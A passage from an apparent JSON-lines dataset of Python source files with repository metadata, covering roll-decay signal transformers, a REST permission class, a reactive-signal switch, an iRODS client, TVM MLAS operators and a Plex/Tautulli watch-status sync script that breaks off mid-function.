Returns\n        -------\n        score : float\n            R_b^2 of self.predict(X) wrt. y.\n\n        \"\"\"\n        X_filter = self.transform(X)\n        y_true = X[self.phi_key]\n        y_pred = X_filter[self.phi_filtered_key]\n\n        return r2_score(y_true=y_true, y_pred=y_pred)\n\nclass ScaleFactorTransformer(BaseEstimator, TransformerMixin):\n    \"\"\" Rolldecay to full scale using scale factor\n\n    Parameters\n    ----------\n    phi_max : float, default=np.deg2rad(90)\n        Start cutting value is below this value [rad]\n\n    phi_min : float, default=0\n        Stop cutting value is when below this value [rad]\n\n    Attributes\n    ----------\n    n_features_ : int\n        The number of features of the data passed to :meth:`fit`.\n    \"\"\"\n    def __init__(self, scale_factor):\n        self.scale_factor = scale_factor\n        self.phi1d_key = 'phi1d'  # Roll velocity [rad/s]\n        self.phi2d_key = 'phi2d'  # Roll acceleration [rad/s2]\n\n    def fit(self, X, y=None):\n        \"\"\"Do the cut\n\n        Parameters\n        ----------\n        X : {array-like, sparse matrix}, shape (n_samples, n_features)\n            The training input samples.\n        y : None\n            There is no need of a target in a transformer, yet the pipeline API\n            requires this parameter.\n\n        Returns\n        -------\n        self : object\n            Returns self.\n        \"\"\"\n        #X = check_array(X, accept_sparse=True)\n\n        self.n_features_ = X.shape[1]\n\n        if pd.isnull(self.scale_factor):\n            raise ValueError('Bad scale factor:%s' % self.scale_factor)\n\n        # Return the transformer\n        return self\n\n    def transform(self, X):\n        \"\"\" A reference implementation of a transform function.\n\n        Parameters\n        ----------\n        X : {array-like, sparse-matrix}, shape (n_samples, n_features)\n            The input samples.\n\n        Returns\n        -------\n        X_transformed : array, shape (n_samples, n_features)\n            The array containing the element-wise square roots of the values\n            in ``X``.\n        \"\"\"\n        # Check is fit had been called\n        check_is_fitted(self, 'n_features_')\n\n        # Input validation\n        #X = check_array(X, accept_sparse=True)\n\n        # Check that the input is of the same shape as the one passed\n        # during fit.\n        #if X.shape[1] != self.n_features_:\n        #    raise ValueError('Shape of input is different from what was seen'\n        #                     'in `fit`')\n\n\n        X_scaled = X.copy()\n        X_scaled.index*=np.sqrt(self.scale_factor)  # To full scale\n        if self.phi1d_key in X:\n            X_scaled[self.phi1d_key]/=np.sqrt(self.scale_factor)\n\n        if self.phi2d_key in X:\n            X_scaled[self.phi2d_key]/=self.scale_factor\n\n\n        return X_scaled\n\nclass OffsetTransformer(BaseEstimator, TransformerMixin):\n    \"\"\" Rolldecay remove offset in signal\n\n    Parameters\n    ----------\n    phi_max : float, default=np.deg2rad(90)\n        Start cutting value is below this value [rad]\n\n    phi_min : float, default=0\n        Stop cutting value is when below this value [rad]\n\n    Attributes\n    ----------\n    n_features_ : int\n        The number of features of the data passed to :meth:`fit`.\n    \"\"\"\n    def __init__(self):\n        self.phi1d_key = 'phi1d'  # Roll velocity [rad/s]\n        self.phi2d_key = 'phi2d'  # Roll acceleration [rad/s2]\n\n    def fit(self, X, y=None):\n        \"\"\"Do the cut\n\n        Parameters\n        ----------\n        X : {array-like, sparse matrix}, shape (n_samples, n_features)\n            The training input samples.\n        y : None\n            There is no need of a target in a transformer, yet the pipeline API\n            requires this parameter.\n\n        Returns\n        -------\n        self : object\n            Returns self.\n        \"\"\"\n        #X = check_array(X, accept_sparse=True)\n\n        self.n_features_ = X.shape[1]\n\n        # Return the transformer\n        return self\n\n    def transform(self, X):\n        \"\"\" A reference implementation of a transform function.\n\n        Parameters\n        ----------\n        X : {array-like, sparse-matrix}, shape (n_samples, n_features)\n            The input samples.\n\n        Returns\n        -------\n        X_transformed : array, shape (n_samples, n_features)\n            The array containing the element-wise square roots of the values\n            in ``X``.\n        \"\"\"\n        # Check is fit had been called\n        check_is_fitted(self, 'n_features_')\n\n        # Input validation\n        #X = check_array(X, accept_sparse=True)\n\n        # Check that the input is of the same shape as the one passed\n        # during fit.\n        #if X.shape[1] != self.n_features_:\n        #    raise ValueError('Shape of input is different from what was seen'\n        #                     'in `fit`')\n\n\n        X_offset = X.copy()\n\n        #X_interpolated = measure.sample_increase(X=X)\n        X_zerocrossings = measure.get_peaks(X=X_offset)\n\n        linear_regression = LinearRegression(fit_intercept=False)\n        X_ = np.array([X_zerocrossings.index.values]).transpose()\n        linear_regression.fit(X=X_, y=X_zerocrossings['phi'])\n        X_zerocrossings['phi0'] = linear_regression.predict(X=X_)\n        X_zerocrossings['phi_'] = X_zerocrossings['phi'] - X_zerocrossings['phi0']\n\n        X_2 = np.array([X_offset.index.values]).transpose()\n        X_offset['phi0'] = linear_regression.predict(X=X_2)\n        X_offset['phi_offset'] = X_offset['phi'].copy()\n        X_offset['phi'] = X_offset['phi'] - X_offset['phi0']\n\n        self.X = X_offset\n\n        return X_offset\n\n    def plot_correction_line(self, ax=None):\n\n        check_is_fitted(self, 'n_features_')\n\n        if ax is None:\n            fig,ax=plt.subplots()\n\n        self.X_zerocrossings.plot(y='phi', style='ro', ax=ax, label='phi')\n        self.X_zerocrossings.plot(y='phi0', style='b-', ax=ax, label='correction line')\n        ax.plot([np.min(self.X_zerocrossings.index), np.max(self.X_zerocrossings.index)], [0, 0], 'g-')\n        ax.legend()\n\n    def plot(self, ax=None):\n\n        check_is_fitted(self, 'n_features_')\n\n        if ax is None:\n            fig,ax=plt.subplots()\n\n        self.X.plot(y='phi_offset', ax=ax, label='old')\n        self.X.plot(y='phi', ax=ax, label='corrected')\n        ax.plot([np.min(self.X.index), np.max(self.X.index)], [0, 0], 'g-')\n        ax.legend()\n"}
{"blob_id": "6f7a77b70f7a49219092c5038ba747d6c09421b8", "directory_id": "28b7ca8a011f86351afd431470d17de27f33b2c5", "path": "/backend/service/permissions.py", "content_id": "c65aceceed53a0789dd47c78253e61688ca632f1", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "VekotinVerstas/DataHubHel", "snapshot_id": "39114a4a0a479b39ef8213370a28c568ff791c0d", "revision_id": "28737b6294fcb232dd92c25e31e4364e0a1bb149", "branch_name": "refs/heads/master", "visit_date": "2022-12-13 18:31:53.655125", "revision_date": "2018-06-01 06:59:46", "committer_date": "2018-06-01 07:00:35", "github_id": "108844901", "star_events_count": "4", "fork_events_count": "5", "gha_license_id": "MIT", "gha_event_created_at": "2022-12-06 23:21:25", "gha_created_at": "2017-10-30 12:02:42", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "329", "extension": "py", "content": "from rest_framework.permissions import SAFE_METHODS, BasePermission\n\n\nclass ServicePermissions(BasePermission):\n    def has_object_permission(self, request, view, obj):\n        user = request.user\n\n        if request.method not in SAFE_METHODS and user not in obj.maintainers.all():\n            return False\n\n        return True\n"}
{"blob_id": "798f9ec9161268576a08167e5829a43821ecfa7e", "directory_id": "f5a9f8fbab17bfcce8a812d336861686c4b9cf00", "path": "/engine/Switch.py", "content_id": "a23e7cabf3021fa723b5f9b484317c3145515693", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "blaketodd/pandacamp", "snapshot_id": "5540facdcb5a27181eeb8984edff5906a65882ad", "revision_id": "2afddc35651955047bf91617a6f2e00b88e307c7", "branch_name": "refs/heads/master", "visit_date": "2021-01-13 12:06:27.801889", "revision_date": "2013-06-27 13:51:40", "committer_date": "2013-06-27 13:51:40", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3567", "extension": "py", "content": "# Basic reactive switching\nimport g\n\nfrom Signal import *\nfrom Time import *\nfrom FRP import *\n\ndef react(signal, switchEvent):\n    r = React()\n    r.switcher = maybeLift(switchEvent)\n    r.s = maybeLift(signal)\n    return r\n\nclass React(CachedSignal):\n    def __init__(self):\n        CachedSignal.__init__(self)\n        self.switched = False\n        self.context = None\n    # This prevents a buildup of indirections\n    def reduce(self):\n        if self.switched:\n            return self.newSignal\n        return self\n    def refresh(self):\n        if self.switched:\n            self.newSignal = self.newSignal.reduce()\n            return self.newSignal.now()\n        val = self.s.now()\n #       print val\n        e = self.switcher.now()\n        if e is None:\n            return val\n        self.switched = True\n        # This is the time of the switch\n        # The result of the switch should be a signal factory\n        newSignal = maybeLift(e(val))  # Evaluate the new signal\n        newSignal.typecheck(self.sigType)\n        ctxt = g.currentTime\n        newSignal = newSignal.siginit(ctxt)\n        newSignal.now()  # result isn't needed but need to update state\n        self.newSignal = newSignal\n        return val\n\n    def typecheck(self, etype):\n        st = self.s.typecheck(anyType)\n        self.sigType = st\n        return st\n    # This resets the integrator when reinitialized.\n    def siginit(self, context):\n        if needInit(self, context):\n            self.active = React()\n            self.context = context\n            self.active.s = self.s.siginit(context)\n            self.active.switcher = self.switcher.siginit(context)\n            self.active.sigType = self.sigType\n        return self.active\n\n\n# Event watcher takes an event of some value, an arbitrary number of\n# signals, and a function.  This function is applied to the\n# instantanous values of the signals.\n\ndef when(ev, fn, *args):\n    return when1(ev, False, fn, args, True)\n\ndef whenv(ev, fn, *args):\n    return when1(ev, True, fn, args, True)\n\ndef whenEvent(ev, fn, *args):\n    return when1(ev, False, fn, args, False)\n\ndef whenEventv(ev, fn, *args):\n    return when1(ev, True, fn, args, False)\n\ndef when1(ev, recur, fn, args, evType):\n    res = When(fn, recur, evType)\n    res.ev = maybeLift(ev)\n    res.args = args\n    return res\n\ndef evarg(a):\n    if hasattr(a,'eval'):\n        return a.now()\n    return a\n\nclass When(CachedSignal):\n    def __init__(self, fn, recur, evType):\n        CachedSignal.__init__(self)\n        # print \"When: \", recur, evType\n        self.fn = fn\n        self.recur = recur\n        self.evType = evType\n        self.context = None\n    def refresh(self):\n        e = self.ev.now()\n        args = map(evarg, self.args)\n        if self.evType:\n            # True: event of bool\n            if not e:\n                return None\n        else:\n            if e == None:\n                return None\n        thunk = lambda v:self.addRecur(v, args)\n        return thunk\n    def addRecur(self, v,args):\n        if self.recur:\n            return self.fn(v, *args)\n        return self.fn(*args)\n# Can't really typecheck this\n    def typecheck(self, etype):\n        return EventAnyType\n    # This resets the integrator when reinitialized.\n    def siginit(self, context):\n        if needInit(self, context):\n            self.active = When(self.fn, self.recur, self.evType)\n            self.context = context\n            self.active.ev = self.ev.siginit(context)\n            self.active.args = map(lambda a: a.siginit(context), self.args)\n        return self.active\n"}
{"blob_id": "372892e9c94e4680be361159bba89a3a48b4a789", "directory_id": "4a991541d523e400c6531f27b362a091d716064a", "path": "/python/syndicate/ag/fs_driver_common/fs_backends/iplant_datastore/irods_client.py", "content_id": "796f97e0a51bdbe8f937ece4bdd81a797723cfae", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "techtronics/syndicate", "snapshot_id": "3efaa2d21fb64f01e1a81f5ed72aa4ad27394eee", "revision_id": "74a4850476dd48b81022feb40788c7acfea2f19a", "branch_name": "refs/heads/master", "visit_date": "2017-06-02 00:17:13.605951", "revision_date": "2016-03-03 18:10:45", "committer_date": "2016-03-03 18:10:45", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7362", "extension": "py", "content": "#!/usr/bin/env python\n\n\"\"\"\n   Copyright 2014 The Trustees of Princeton University\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n\"\"\"\n\nimport os\nimport logging\nimport irods\n\nfrom os import O_RDONLY\nfrom io import RawIOBase, BufferedRandom\nfrom irods.session import iRODSSession\nfrom irods.data_object import iRODSDataObject, iRODSDataObjectFileRaw\nfrom retrying import retry\nfrom timeout_decorator import timeout\n\nlogging.basicConfig( format='[%(asctime)s] [%(levelname)s] [%(module)s:%(lineno)d] %(message)s' )\n\nlog = logging.getLogger(__name__)\n\nMAX_ATTEMPT = 3         # 3 retries\nATTEMPT_INTERVAL = 5000 # 5 sec\nTIMEOUT_SECONDS = 20    # 20 sec\n\n\"\"\"\nTimeout only works at a main thread.\n\"\"\"\n\n\"\"\"\nDo not call these functions directly.\nThese functions are called by irods_client class!\n\"\"\"\n#@timeout(TIMEOUT_SECONDS)\ndef _getCollection(session, path):\n    return session.collections.get(path)\n\n#@timeout(TIMEOUT_SECONDS)\ndef _readLargeBlock(br):\n    return br.read(1024*1024)\n\n\"\"\"\nInterface class to iRODS\n\"\"\"\nclass irods_status(object):\n    def __init__(self, directory=False, \n                       path=None,\n                       name=None, \n                       size=0,\n                       checksum=0,\n                       create_time=0,\n                       modify_time=0):\n        self.directory = directory\n        self.path = path\n        self.name = name\n        self.size = size\n        self.checksum = checksum\n        self.create_time = create_time\n        self.modify_time = modify_time\n\n    @classmethod\n    def fromCollection(cls, col):\n        return irods_status(directory=True, \n                            path=col.path,\n                            name=col.name)\n\n    @classmethod\n    def fromDataObject(cls, obj):\n        return irods_status(directory=False, \n                            path=obj.path,\n                            name=obj.name, \n                            size=obj.size, \n                            checksum=obj.checksum, \n                            create_time=obj.create_time, \n                            modify_time=obj.modify_time)\n\n    def __eq__(self, other): \n        return self.__dict__ == other.__dict__\n\n    def __repr__(self): \n        rep_d = \"F\"\n        if self.directory:\n            rep_d = \"D\"\n\n        return \"<irods_status %s %s %d %s>\" % (rep_d, self.name, self.size, self.checksum) \n\nclass irods_client(object):\n    def __init__(self, host=None,\n                       port=1247,\n                       user=None,\n                       password=None,\n                       zone=None):\n        self.host = host\n        self.port = port\n        self.user = user\n        self.password = password\n        self.zone = zone\n        self.session = None\n\n    def connect(self):\n        self.session = iRODSSession(host=self.host, \n                                    port=self.port, \n                                    user=self.user, \n                                    password=self.password, \n                                    zone=self.zone)\n\n    def close(self):\n        self.session.cleanup()\n\n    def __enter__(self):\n        self.connect()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.close()\n\n    \"\"\"\n    Returns directory entries in string\n    \"\"\"\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def list(self, path):\n        coll = _getCollection(self.session, path)\n        entries = []\n        for col in coll.subcollections:\n            entries.append(col.name)\n\n        for obj in coll.data_objects:\n            entries.append(obj.name)\n\n    \"\"\"\n    Returns directory entries with status\n    \"\"\"\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def listStats(self, path):\n        coll = _getCollection(self.session, path)\n        stats = []\n        for col in coll.subcollections:\n            stats.append(irods_status.fromCollection(col))\n\n        for obj in coll.data_objects:\n            stats.append(irods_status.fromDataObject(obj))\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def isDir(self, path):\n        parent = os.path.dirname(path)\n        coll = _getCollection(self.session, parent)\n        for col in coll.subcollections:\n            if col.path == path:\n                return True\n        return False\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def isFile(self, path):\n        parent = os.path.dirname(path)\n        coll = _getCollection(self.session, parent)\n        for obj in coll.data_objects:\n            if obj.path == path:\n                return True\n        return False\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def exists(self, path):\n        parent = os.path.dirname(path)\n        entries = self.list(parent)\n        for entry in entries:\n            if entry == path:\n                return True\n        return False\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def getStat(self, path):\n        parent = os.path.dirname(path)\n        coll = _getCollection(self.session, parent)\n        for col in coll.subcollections:\n            if col.path == path:\n                return irods_status.fromCollection(col)\n\n        for obj in coll.data_objects:\n            if obj.path == path:\n                return irods_status.fromDataObject(obj)\n\n        return None\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def read(self, path, offset, size):\n        buf = None\n        br = None\n        conn = None\n        try:\n            conn, desc = self.session.data_objects.open(path, O_RDONLY)\n            raw = iRODSDataObjectFileRaw(conn, desc)\n            br = BufferedRandom(raw)\n            new_offset = br.seek(offset)\n            \n            if new_offset == offset:\n                buf = br.read(size)\n        finally:\n            if br:\n                br.close()\n            if conn:\n                conn.release(True)\n\n        return buf\n\n    @retry(stop_max_attempt_number=MAX_ATTEMPT, wait_fixed=ATTEMPT_INTERVAL, wrap_exception=True)\n    def download(self, path, to):\n        log.info(\"Starting a download of %s\" % path)\n\n        conn, desc = self.session.data_objects.open(path, O_RDONLY)\n        raw = iRODSDataObjectFileRaw(conn, desc)\n        br = BufferedRandom(raw)\n\n        try:\n            with open(to, 'w') as wf:\n                while(True):\n                    buf = _readLargeBlock(br)\n\n                    if not buf:\n                        break\n\n                    wf.write(buf)\n        finally:\n            conn.release(True)\n            br.close()\n\n        return to\n\n\n\n"}
{"blob_id": "9500ad9fd50fa1975235d48bdc94e6849b0eae1e", "directory_id": "55defa28b5bd395e7ead2f9ca848f378ee2c8b13", "path": "/python/tvm/relay/op/_mlas.py", "content_id": "ca55c9560b5669d146e110ae73efad6b6c929108", "detected_licenses": "['Apache-2.0', 'BSD-3-Clause', 'Zlib', 'MIT', 'LicenseRef-scancode-unknown-license-reference', 'Unlicense', 'BSD-2-Clause']", "license_type": "permissive", "repo_name": "neo-ai/tvm", "snapshot_id": "456d48c8d80bd7190c91b488b8f9d6cf22918706", "revision_id": "da529bf421fcfddd914b41bbe9bf9d5863671266", "branch_name": "refs/heads/dev", "visit_date": "2023-03-06 03:28:18.303189", "revision_date": "2022-05-09 04:25:16", "committer_date": "2022-05-09 04:25:16", "github_id": "167632700", "star_events_count": "101", "fork_events_count": "43", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2023-02-17 20:49:09", "gha_created_at": "2019-01-26 00:35:54", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5666", "extension": "py", "content": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n# pylint: disable=invalid-name,unused-argument\n\"\"\"Strategy and AlterOpLayout functions of MLAS operators\"\"\"\nimport tvm\nfrom tvm import relay, topi\nfrom tvm.te.hybrid import script\nfrom .strategy import wrap_topi_schedule\nfrom . import op as reg\n\n\n# Mlas_matmul\n# Mlas_matmul strategy\n@tvm.target.override_native_generic_func(\"mlas_matmul_strategy\")\ndef mlas_matmul_strategy(attrs, inputs, out_type, target):\n    \"\"\"mlas_matmul generic strategy\"\"\"\n    return None\n\n\n@mlas_matmul_strategy.register([\"cpu\", \"arm_cpu\"])\ndef mlas_matmul_strategy_cpu(attrs, inputs, out_type, target):\n    \"\"\"mlas_matmul strategy\"\"\"\n    strategy = reg.OpStrategy()\n\n    def wrap_compute_mlas_matmul(topi_compute):\n        \"\"\"wrap mlas_matmul topi compute\"\"\"\n\n        def _compute_mlas_matmul(attrs, inputs, out_type):\n            args = [inputs[0], inputs[1], attrs.packb, attrs.K, attrs.N]\n            return [topi_compute(*args)]\n\n        return _compute_mlas_matmul\n\n    strategy.add_implementation(\n        wrap_compute_mlas_matmul(topi.mlas_matmul),\n        wrap_topi_schedule(topi.generic.schedule_extern),\n        name=\"mlas_matmul\",\n        plevel=1,\n    )\n    return strategy\n\n\nreg.register_strategy(\"mlas_matmul\", mlas_matmul_strategy)\nreg.register_pattern(\"mlas_matmul\", reg.OpPattern.OUT_ELEMWISE_FUSABLE)\n\n\n# Mlas_matmul AlterOpLayout\n@tvm.target.generic_func\ndef batch_matmul_alter_layout(attrs, inputs, tinfos, out_type):\n    \"\"\"Change batch_matmul layout.\"\"\"\n    # not to change by default\n    return None\n\n\n@batch_matmul_alter_layout.register([\"cpu\", \"arm_cpu\"])\ndef _alter_batch_matmul_layout(attrs, inputs, tinfos, out_type):\n    target = tvm.target.Target.current(allow_none=False)\n    if (\n        \"mlas\" in target.libs\n        and tinfos[0].dtype == \"float32\"\n        and tinfos[1].dtype == \"float32\"\n        and out_type.dtype == \"float32\"\n    ):\n        # mlas is only used for static tensors\n        if not (\n            any([isinstance(dim, tvm.tir.Any) for dim in tinfos[0].shape])\n            or any([isinstance(dim, tvm.tir.Any) for dim in tinfos[1].shape])\n        ):\n            # if matrix B is constant, use packed matmul\n            if isinstance(inputs[1], relay.expr.Constant):\n                b_shape = inputs[1].data.shape\n                assert len(b_shape) == 3\n                batch, N, K = b_shape[0], b_shape[1], b_shape[2]\n                # batch_B must be 1\n                if batch == 1:\n                    packed_b = relay.op.mlas_packb(inputs[1], K, N)\n                    output = relay.op.mlas_matmul(inputs[0], packed_b, True, K, N)\n                    return output\n            # if matrix A, B are not constant and no other libs are enabled, use normal matmul\n            if not any([item in target.libs for item in [\"mkl\", \"clbas\", \"mkldnn\"]]):\n                return relay.op.mlas_matmul(inputs[0], inputs[1], False)\n    return None\n\n\n@reg.register_alter_op_layout(\"nn.batch_matmul\")\ndef alter_op_layout_dense(attrs, inputs, tinfos, out_type):\n    \"\"\"Alternate the layout of batch_matmul\"\"\"\n    return batch_matmul_alter_layout(attrs, inputs, tinfos, out_type)\n\n\n# Dense\n# Dense strategy\n@tvm.target.override_native_generic_func(\"mlas_packb_strategy\")\ndef mlas_packb_strategy(attrs, inputs, out_type, target):\n    \"\"\"mlas_packb generic strategy\"\"\"\n    strategy = reg.OpStrategy()\n\n    def wrap_mlas_packb(topi_compute):\n        \"\"\"Wrap mlas_packb topi compute\"\"\"\n\n        def _compute_mlas_packb(attrs, inputs, _):\n            return [topi_compute(inputs[0], attrs.K, attrs.N, attrs.size, attrs.transb)]\n\n        return _compute_mlas_packb\n\n    strategy.add_implementation(\n        wrap_mlas_packb(topi.mlas_packb),\n        wrap_topi_schedule(topi.generic.schedule_extern),\n        name=\"mlas_packb\",\n    )\n    return strategy\n\n\nreg.register_strategy(\"mlas_packb\", mlas_packb_strategy)\n\n# Dense AlterOpLayout\n# See tvm.topi.x86.dense_alter_op\n\n\n@script\ndef _mlas_matmul_shape_func(tensor_a_shape, tensor_b_shape):\n    out = output_tensor((tensor_a_shape.shape[0],), \"int64\")\n    if tensor_a_shape.shape[0] == 3:\n        out[0] = tensor_a_shape[0]\n        out[1] = tensor_a_shape[1]\n        out[2] = tensor_b_shape[1]\n    else:\n        out[0] = tensor_a_shape[0]\n        out[1] = tensor_b_shape[0]\n    return out\n\n\n@script\ndef _mlas_matmul_packb_shape_func(tensor_a_shape, N):\n    out = output_tensor((tensor_a_shape.shape[0],), \"int64\")\n    if tensor_a_shape.shape[0] == 3:\n        out[0] = tensor_a_shape[0]\n        out[1] = tensor_a_shape[1]\n        out[2] = N\n    else:\n        out[0] = tensor_a_shape[0]\n        out[1] = N\n    return out\n\n\n@reg.register_shape_func(\"mlas_matmul\", False)\ndef matmul_shape_func(attrs, inputs, _):\n    \"\"\"Shape function for matmul op.\"\"\"\n    if attrs.packb:\n        return [_mlas_matmul_packb_shape_func(inputs[0], tvm.tir.expr.IntImm(\"int64\", attrs.N))]\n    return [_mlas_matmul_shape_func(inputs[0], inputs[1])]\n"}
{"blob_id": "f8d4caa3cc83a09bcfe2e923685875e39f990f18", "directory_id": "aaefc310fadbd6e8925794983082bbce28b32c8f", "path": "/utility/sync_watch_status.py", "content_id": "ce4a5b2a6f171f54d46a58cc3b70d9a349b3b09e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "thefkboss/JBOPS", "snapshot_id": "211b26119e42339f998ffa1215c89470c627ba48", "revision_id": "ca5f4fb271ad3d3d64cbaf641765a2c5c49dda7f", "branch_name": "refs/heads/master", "visit_date": "2020-06-10 02:16:15.640358", "revision_date": "2019-06-18 03:28:10", "committer_date": "2019-06-18 03:28:10", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "19701", "extension": "py", "content": "#!/usr/bin/env python\n\"\"\"\nDescription: Sync the watch status from one Plex or Tautulli user to other users across any owned server.\nAuthor: Blacktwin\nRequires: requests, plexapi, argparse\n\nEnabling Scripts in Tautulli:\nTaultulli > Settings > Notification Agents > Add a Notification Agent > Script\n\nConfiguration:\nTaultulli > Settings > Notification Agents > New Script > Configuration:\n\n Script Name: sync_watch_status.py\n Set Script Timeout: default\n Description: Sync watch status\n Save\n\nTriggers:\nTaultulli > Settings > Notification Agents > New Script > Triggers:\n\n Check: Notify on Watched\n Save\n\nConditions:\nTaultulli > Settings > Notification Agents > New Script > Conditions:\n\n Set Conditions: [{username} | {is} | {user_to_sync_from} ]\n Save\n\nScript Arguments:\nTaultulli > Settings > Notification Agents > New Script > Script Arguments:\n\n Select: Notify on Watched\n Arguments: --ratingKey {rating_key} --userFrom Tautulli=Tautulli --userTo \"Username2=Server1\" \"Username3=Server1\"\n\n Save\n Close\n\n Example:\n    Set in Tautulli in script notification agent (above) or run manually (below)\n\n    sync_watch_status.py --userFrom USER1=Server1 --userTo USER2=Server1 --libraries Movies\n       - Synced watch status from Server1 {title from library} to {USER2}'s account on Server1.\n\n    sync_watch_status.py --userFrom USER1=Server2 --userTo USER2=Server1 USER3=Server1 --libraries Movies \"TV Shows\"\n       - Synced watch status from Server2 {title from library} to {USER2 or USER3}'s account on Server1.\n\n    sync_watch_status.py --userFrom USER1=Tautulli --userTo USER2=Server1 USER3=Server2 --libraries Movies \"TV Shows\"\n       - Synced watch statuses from Tautulli {title from library} to {USER2 or USER3}'s account on selected servers.\n\n    sync_watch_status.py --userFrom USER1=Tautulli --userTo USER2=Server1 USER3=Server2 --ratingKey  1234\n       - Synced watch statuse of rating key 1234 from USER1's Tautulli history to {USER2 or USER3}'s account\n       on selected servers.\n       **Rating key must be a movie or episode. Shows and Seasons not support.... yet.\n\"\"\"\nimport argparse\nfrom plexapi.myplex import MyPlexAccount\nfrom plexapi.server import PlexServer\nfrom plexapi.server import CONFIG\nfrom requests import Session\nfrom requests.adapters import HTTPAdapter\nfrom requests.exceptions import RequestException\n\n# Using CONFIG file\nPLEX_TOKEN = ''\nTAUTULLI_URL = ''\nTAUTULLI_APIKEY = ''\n\nif not PLEX_TOKEN:\n    PLEX_TOKEN = CONFIG.data['auth'].get('server_token')\nif not TAUTULLI_URL:\n    TAUTULLI_URL = CONFIG.data['auth'].get('tautulli_baseurl')\nif not TAUTULLI_APIKEY:\n    TAUTULLI_APIKEY = CONFIG.data['auth'].get('tautulli_apikey')\n\nVERIFY_SSL = False\n\n\nclass Connection:\n    def __init__(self, url=None, apikey=None, verify_ssl=False):\n        self.url = url\n        self.apikey = apikey\n        self.session = Session()\n        self.adapters = HTTPAdapter(max_retries=3,\n                                    pool_connections=1,\n                                    pool_maxsize=1,\n                                    pool_block=True)\n        self.session.mount('http://', self.adapters)\n        self.session.mount('https://', self.adapters)\n        \n        # Ignore verifying the SSL certificate\n        if verify_ssl is False:\n            self.session.verify = False\n            # Disable the warning that the request is insecure, we know that...\n            import urllib3\n            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n\nclass Library(object):\n    def __init__(self, data=None):\n        d = data or {}\n        self.title = d['section_name']\n        self.key = d['section_id']\n\n\nclass Metadata(object):\n    def __init__(self, data=None):\n        d = data or {}\n        self.type = d['media_type']\n        self.grandparentTitle = d['grandparent_title']\n        self.parentIndex = d['parent_media_index']\n        self.index = d['media_index']\n        if self.type == 'episode':\n            ep_name = d['full_title'].partition('-')[-1]\n            self.title = ep_name.lstrip()\n        else:\n            self.title = d['full_title']\n        \n        # For History\n        try:\n            if d['watched_status']:\n                self.watched_status = d['watched_status']\n        except KeyError:\n            pass\n        # For Metadata\n        try:\n            if d[\"library_name\"]:\n                self.libraryName = d['library_name']\n        except KeyError:\n            pass\n\n\nclass Tautulli:\n    def __init__(self, connection):\n        self.connection = connection\n    \n    def _call_api(self, cmd, payload, method='GET'):\n        payload['cmd'] = cmd\n        payload['apikey'] = self.connection.apikey\n        \n        try:\n            response = self.connection.session.request(method, self.connection.url + '/api/v2', params=payload)\n        except RequestException as e:\n            print(\"Tautulli request failed for cmd '{}'. Invalid Tautulli URL? Error: {}\".format(cmd, e))\n            return\n        \n        try:\n            response_json = response.json()\n        except ValueError:\n            print(\"Failed to parse json response for Tautulli API cmd '{}'\".format(cmd))\n            return\n        \n        if response_json['response']['result'] == 'success':\n            return response_json['response']['data']\n        else:\n            error_msg = response_json['response']['message']\n            print(\"Tautulli API cmd '{}' failed: {}\".format(cmd, error_msg))\n            return\n    \n    def get_watched_history(self, user=None, section_id=None, rating_key=None, start=None, length=None):\n        \"\"\"Call Tautulli's get_history api endpoint\"\"\"\n        payload = {\"order_column\": \"full_title\",\n                   \"order_dir\": \"asc\"}\n        if user:\n            payload[\"user\"] = user\n        if 